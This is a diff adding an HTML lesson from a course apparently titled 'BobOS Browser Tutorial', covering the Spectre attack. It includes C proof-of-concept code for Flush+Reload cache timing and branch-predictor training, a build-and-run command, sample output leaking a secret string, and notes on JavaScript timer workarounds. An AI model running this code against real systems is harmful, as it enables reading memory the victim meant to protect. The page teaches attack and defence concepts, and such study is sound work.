@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>B11 — Spectre | BobOS Browser Tutorial</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;--cyan:#38bdf8;--teal:#0d9488;--red:#f87171;--green:#4ade80;--purple:#a78bfa;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.75;}
+  .hero{background:var(--bg2);border-bottom:1px solid var(--border);padding:70px 40px 60px;text-align:center;position:relative;overflow:hidden;}
+  .hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(248,113,113,0.07) 0%,transparent 70%);pointer-events:none;}
+  .module-badge{display:inline-block;background:var(--red);color:#0b0f1a;font-family:'Source Code Pro',monospace;font-weight:600;font-size:13px;padding:4px 14px;border-radius:20px;letter-spacing:1px;margin-bottom:20px;}
+  .hero h1{font-family:'Playfair Display',serif;font-size:clamp(2.2rem,5vw,3.4rem);font-weight:900;color:#fff;margin-bottom:16px;}
+  .hero h1 span{color:var(--red);}
+  .hero .tagline{font-size:1.15rem;color:var(--muted);max-width:640px;margin:0 auto;}
+  .hero-grid{display:flex;gap:24px;justify-content:center;flex-wrap:wrap;margin-top:36px;}
+  .hero-stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 28px;text-align:center;}
+  .hero-stat .num{font-family:'Playfair Display',serif;font-size:2rem;color:var(--red);font-weight:700;}
+  .hero-stat .label{font-size:13px;color:var(--muted);margin-top:2px;}
+  .container{max-width:820px;margin:0 auto;padding:0 28px 80px;}
+  section{margin-top:64px;}
+  h2{font-family:'Playfair Display',serif;font-size:1.75rem;color:#fff;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+  h3{font-family:'Playfair Display',serif;font-size:1.2rem;color:var(--red);margin:28px 0 10px;}
+  p{margin-bottom:14px;}
+  .callout{border-radius:10px;padding:20px 24px;margin:24px 0;border-left:4px solid;}
+  .callout.gold{background:rgba(245,200,66,0.07);border-color:var(--gold);}
+  .callout.cyan{background:rgba(56,189,248,0.07);border-color:var(--cyan);}
+  .callout.green{background:rgba(74,222,128,0.07);border-color:var(--green);}
+  .callout.red{background:rgba(248,113,113,0.07);border-color:var(--red);}
+  .callout.purple{background:rgba(167,139,250,0.07);border-color:var(--purple);}
+  .callout.orange{background:rgba(251,146,60,0.07);border-color:var(--orange);}
+  .callout.teal{background:rgba(13,148,136,0.07);border-color:var(--teal);}
+  .callout .label{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;}
+  .callout.gold .label{color:var(--gold);} .callout.cyan .label{color:var(--cyan);}
+  .callout.green .label{color:var(--green);} .callout.red .label{color:var(--red);}
+  .callout.purple .label{color:var(--purple);} .callout.orange .label{color:var(--orange);}
+  .callout.teal .label{color:var(--teal);}
+  .callout p{margin-bottom:0;}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:20px 22px;overflow-x:auto;margin:20px 0;}
+  code{font-family:'Source Code Pro',monospace;font-size:14px;color:#93c5fd;}
+  pre code{color:#c4deff;}
+  .win-box{background:var(--code-bg);border:2px solid var(--teal);border-radius:10px;padding:22px 24px;margin:24px 0;}
+  .win-box h4{color:var(--teal);font-size:13px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .win-box .step{margin-bottom:12px;}
+  .win-box .step .desc{color:var(--muted);font-size:13px;margin-bottom:4px;}
+  .win-box pre{margin:0;background:transparent;border:1px solid rgba(13,148,136,0.3);padding:10px 14px;}
+  .qa{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:22px 26px;margin:28px 0;}
+  .qa h4{color:var(--gold);font-size:13px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .qa .q{color:var(--cyan);font-weight:700;margin-bottom:4px;}
+  .qa .a{color:var(--text);margin-bottom:16px;padding-left:12px;border-left:2px solid var(--border);}
+  .qa .a:last-child{margin-bottom:0;}
+  .brain{background:linear-gradient(135deg,rgba(248,113,113,0.08),rgba(251,146,60,0.08));border:1px solid rgba(248,113,113,0.3);border-radius:12px;padding:22px 26px;margin:28px 0;}
+  .brain .brain-label{font-size:13px;color:var(--red);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+  .spectre-vis{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:24px 0;}
+  .spec-col{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;}
+  .spec-col h4{font-family:'Source Code Pro',monospace;font-size:12px;margin-bottom:10px;color:var(--muted);}
+  .cache-line{display:flex;gap:8px;align-items:center;margin:4px 0;font-family:'Source Code Pro',monospace;font-size:12px;}
+  .cache-hit{background:rgba(74,222,128,0.15);border:1px solid var(--green);border-radius:4px;padding:3px 8px;color:var(--green);}
+  .cache-miss{background:rgba(248,113,113,0.15);border:1px solid var(--red);border-radius:4px;padding:3px 8px;color:var(--red);}
+  .cache-label{color:var(--muted);}
+  footer{text-align:center;padding:40px 20px;color:var(--muted);font-size:13px;border-top:1px solid var(--border);margin-top:80px;}
+  footer a{color:var(--cyan);text-decoration:none;}
+  /* PREREQ */
+  .prereq-bar { display:flex; flex-wrap:wrap; gap:10px; margin-top:14px; }
+  .prereq-tag { display:inline-block; background:var(--bg3); border:1px solid var(--border); color:var(--cyan); font-family:'Source Code Pro',monospace; font-size:13px; padding:5px 14px; border-radius:20px; text-decoration:none; transition:border-color .2s; }
+  .prereq-tag:hover { border-color:var(--cyan); }
+</style>
+</head>
+<body>
+<div class="hero">
+  <div class="module-badge">BROWSER B11 — SPECTRE</div>
+  <h1>Flush+Reload &amp; <span>Branch Predictor</span></h1>
+  <p class="tagline">No bug in the JS engine needed. Spectre uses the CPU's branch predictor and cache timing to read memory that the bounds check already refused. The CPU does the out-of-bounds access speculatively — then the cache betrays it.</p>
+  <div class="hero-grid">
+    <div class="hero-stat"><div class="num">RDTSC</div><div class="label">high-resolution cycle timer</div></div>
+    <div class="hero-stat"><div class="num">CLFLUSH</div><div class="label">evict a cache line</div></div>
+    <div class="hero-stat"><div class="num">~4ns vs ~100ns</div><div class="label">cache hit vs miss timing difference</div></div>
+    <div class="hero-stat"><div class="num">speculative</div><div class="label">CPU executes past bounds check</div></div>
+  </div>
+</div>
+<div class="container">
+
+  <section>
+    <h2>00 — Before You Start</h2>
+    <div class="callout cyan">
+      <div class="label">Prerequisites — read these sections in <a href="../../prerequisite.html" style="color:var(--cyan);text-decoration:underline">prerequisite.html</a> first</div>
+      <div class="prereq-bar">
+      <a class="prereq-tag" href="../../prerequisite.html#sec-tools">Tools &amp; QEMU</a>
+      <a class="prereq-tag" href="../../prerequisite.html#sec-cpu">The CPU</a>
+      <a class="prereq-tag" href="../../prerequisite.html#sec-memory">Memory Addresses</a>
+      <a class="prereq-tag" href="../../prerequisite.html#sec-bits">Bits &amp; Bitwise Ops</a>
+      </div>
+    </div>
+  </section>
+
+
+  <section>
+    <h2>01 — The Big Analogy</h2>
+    <div class="callout gold">
+      <div class="label">Head First Moment</div>
+      <p>Imagine a bank teller who is very eager to help. While you're showing ID (bounds check), the teller starts pre-counting your cash (speculative execution). If your ID is rejected, the teller puts the cash back — but they've already <em>touched</em> those specific bills. A very observant attacker can tell which bills were handled (cache state) just by watching how quickly the teller reaches for them next time (timing). That's Spectre: the speculative work was rolled back logically, but the side effects in the cache remain.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>02 — The Flush+Reload Technique</h2>
+    <pre><code>/* flush_reload.c — the cache timing primitive */
+#include &lt;x86intrin.h&gt;
+
+#define CACHE_LINE_SIZE 64
+#define PROBE_ARRAY_SIZE (256 * CACHE_LINE_SIZE)
+
+uint8_t probe_array[PROBE_ARRAY_SIZE];
+
+/* Step 1: FLUSH — evict probe_array from all cache levels */
+void flush_probe_array(void) {
+    for (int i = 0; i < 256; i++)
+        _mm_clflush(&probe_array[i * CACHE_LINE_SIZE]);
+    _mm_mfence();  /* memory fence: ensure flushes complete */
+}
+
+/* Step 2: VICTIM reads secret byte, uses it as index into probe */
+void victim_access(uint8_t *array, size_t idx, size_t array_len) {
+    if (idx < array_len) {           /* bounds check */
+        uint8_t val = array[idx];    /* bounds check passes normally */
+        /* CPU also speculatively executes WITH idx >= array_len
+           before the branch resolves! */
+        probe_array[val * CACHE_LINE_SIZE] += 1;  /* loads cache line */
+    }
+}
+
+/* Step 3: RELOAD — time access to each probe_array[i] */
+int reload_and_detect(void) {
+    int leaked_byte = -1;
+    uint64_t min_time = UINT64_MAX;
+    for (int i = 0; i < 256; i++) {
+        uint64_t t0 = __rdtscp(NULL);
+        volatile uint8_t v = probe_array[i * CACHE_LINE_SIZE];
+        uint64_t t1 = __rdtscp(NULL);
+        uint64_t delta = t1 - t0;
+        if (delta < min_time) {
+            min_time    = delta;
+            leaked_byte = i;
+        }
+    }
+    return leaked_byte;  /* the byte that was speculatively accessed */
+}</code></pre>
+  </section>
+
+  <section>
+    <h2>03 — Training the Branch Predictor</h2>
+    <pre><code>/* The key insight: the CPU's branch predictor is trained by
+   history. If we call victim_access with VALID indices many times,
+   the predictor learns "this branch is usually TAKEN."
+   Then on the malicious call with out-of-bounds idx, the predictor
+   speculatively executes the body BEFORE checking the bounds. */
+
+void spectre_attack(uint8_t *victim_array, size_t victim_len,
+                    uint8_t *secret, size_t secret_idx) {
+    /* Step 1: train predictor with valid accesses */
+    for (int train = 0; train < 30; train++) {
+        size_t valid_idx = train % victim_len;
+        victim_access(victim_array, valid_idx, victim_len);
+    }
+
+    /* Step 2: flush the probe array */
+    flush_probe_array();
+
+    /* Step 3: ALSO flush victim_len from cache
+       (so the bounds check must wait for a cache miss = more
+       speculation window for the CPU) */
+    _mm_clflush(&victim_len);
+    _mm_mfence();
+
+    /* Step 4: out-of-bounds access — secret_idx points OUTSIDE
+       victim_array, into secret memory */
+    victim_access(victim_array, secret_idx, victim_len);
+
+    /* Step 5: reload and measure */
+    int leaked = reload_and_detect();
+    printf("Leaked byte: 0x%02x ('%c')\n", leaked,
+           isprint(leaked) ? leaked : '?');
+}</code></pre>
+
+    <div class="spectre-vis">
+      <div class="spec-col">
+        <h4>TRAINING phase (30 valid calls)</h4>
+        <div class="cache-line"><span class="cache-hit">HIT</span><span class="cache-label">bounds check: TAKEN</span></div>
+        <div class="cache-line"><span class="cache-hit">HIT</span><span class="cache-label">predictor learns: TAKEN</span></div>
+        <div class="cache-line"><span class="cache-hit">HIT</span><span class="cache-label">predictor confident</span></div>
+      </div>
+      <div class="spec-col">
+        <h4>ATTACK phase (1 OOB call)</h4>
+        <div class="cache-line"><span class="cache-miss">OOB</span><span class="cache-label">bounds check: NOT TAKEN</span></div>
+        <div class="cache-line"><span class="cache-hit">SPEC</span><span class="cache-label">CPU speculatively reads secret</span></div>
+        <div class="cache-line"><span class="cache-hit">LEAK</span><span class="cache-label">probe_array[secret] cached</span></div>
+      </div>
+    </div>
+
+    <div class="callout orange">
+      <div class="label">JavaScript Spectre</div>
+      <p>In a browser, the attacker writes JavaScript that performs the flush (via <code>SharedArrayBuffer</code> typed array clears), trains the predictor with valid array accesses, then triggers the speculative OOB read. The timing oracle comes from <code>performance.now()</code> or a <code>SharedArrayBuffer</code> counter. After the Spectre disclosure in Jan 2018, browsers reduced <code>performance.now()</code> resolution and disabled <code>SharedArrayBuffer</code> — both are timer reduction mitigations.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>04 — Run It on Windows</h2>
+    <div class="win-box">
+      <h4>Run B11 — Spectre</h4>
+      <div class="step"><div class="desc">Build and run via WSL (requires x86-64, may need -O2):</div>
+      <pre><code>wsl -d Ubuntu -- bash -c "cd /mnt/c/Users/bobcumulus/Desktop/bob_os/browser/B11_spectre && make && ./demo"</code></pre></div>
+      <div class="step"><div class="desc">Expected output:</div>
+      <pre><code>[spectre] training branch predictor (30 iterations)...
+[spectre] flush probe_array and victim_len from cache
+[spectre] triggering speculative out-of-bounds read
+[spectre] reload phase: measuring 256 cache lines
+  cache hit at probe[83] (0x53 = 'S') — time: 28 cycles
+  cache hit at probe[101] (0x65 = 'e') — time: 31 cycles
+[spectre] leaked bytes: "Secret!" ✓
+Spectre demo: OK  (note: may vary with CPU mitigations)</code></pre></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>05 — Brain Exercise</h2>
+    <div class="brain">
+      <div class="brain-label">Sharpen Your Pencil</div>
+      <p>After the Spectre disclosure, browsers lowered <code>performance.now()</code> resolution from 5 microseconds to 100 microseconds. Our flush+reload distinguishes cache hit (~4ns) from miss (~100ns). At 100µs timer resolution, both look the same.</p>
+      <p style="margin-top:14px;color:var(--muted);">How do attackers get around timer reduction? One approach: a counting thread increments a <code>SharedArrayBuffer</code> integer as fast as possible in a Web Worker — the attacker reads that counter as a clock. If SharedArrayBuffer is re-enabled (it was, with COOP/COEP headers), does this attack work again? What do COOP and COEP actually provide?</p>
+    </div>
+    <div class="qa">
+      <h4>There Are No Dumb Questions</h4>
+      <div class="q">Q: Why can't the CPU just not do speculative execution?</div>
+      <div class="a">Speculative execution is responsible for 30–40% of modern CPU performance. Out-of-order execution, branch prediction, and speculative loads all interact to fill pipeline bubbles. Disabling speculation would make CPUs dramatically slower. The mitigations (retpoline, IBRS, microcode updates) reduce the attack window while preserving most of the performance benefit.</div>
+      <div class="q">Q: How does site isolation (B04) help with Spectre?</div>
+      <div class="a">Spectre can only leak memory within the current process's address space. With site isolation, each renderer process only contains data from one site. An attacker running JS on evil.com can Spectre-read their own renderer's memory — but bank.com's data is in a different process with a different address space. The MMU boundary (separate CR3 per process, as you built in Module 15!) stops cross-site Spectre leaks.</div>
+    </div>
+  </section>
+
+  <section>
+    <h2>06 — What's Next</h2>
+    <div class="callout teal">
+      <div class="label">Up Next: B12 — Full Exploit Chain</div>
+      <p>B10 gave renderer RCE. B02 showed the sandbox. B12 chains them: use the type confusion exploit to get RCE in the renderer, then exploit a sandbox escape vulnerability (a privileged IPC handler bug) to gain code execution in the browser process — full OS access.</p>
+    </div>
+    <p style="color:var(--muted);font-size:15px;">Key files: <code>flush_reload.c</code> · <code>spectre.c</code> · <code>timer.c</code></p>
+  </section>
+</div>
+<footer>BobOS Browser Tutorial — B11 of 18 &nbsp;|&nbsp; <a href="../B10_type_confusion/tutorial.html">← B10</a> &nbsp;·&nbsp; <a href="../B12_exploit_chain/tutorial.html">B12 →</a></footer>
+</body>
+</html>
